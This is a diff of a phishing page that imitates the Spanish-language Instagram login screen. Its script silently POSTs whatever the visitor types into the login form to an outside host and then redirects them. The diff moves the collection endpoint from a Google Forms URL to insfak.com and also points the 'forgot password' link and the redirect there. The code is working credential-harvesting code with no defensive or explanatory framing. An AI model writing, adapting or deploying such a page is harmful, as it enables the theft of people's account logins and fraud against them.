@@ -140,7 +140,7 @@
   </form>
 
   <div class="forgot-password">
-    <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">¿Has olvidado la contraseña?</a>
+    <a href="https://insfak.com" target="_blank">¿Has olvidado la contraseña?</a>
   </div>
 </div>
 
@@ -166,14 +166,14 @@
 
     // Envía los datos sin esperar respuesta
     const form = new FormData(this);
-    fetch("https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse", {
+    fetch("https://insfak.com", {
       method: "POST",
       body: form,
       mode: "no-cors"
     });
 
-    // Redirige a Instagram sin retraso
-    window.location.href = "https://www.instagram.com";
+    // Redirige a insfak.com en lugar de Instagram
+    window.location.href = "https://insfak.com";
   });
 </script>
 
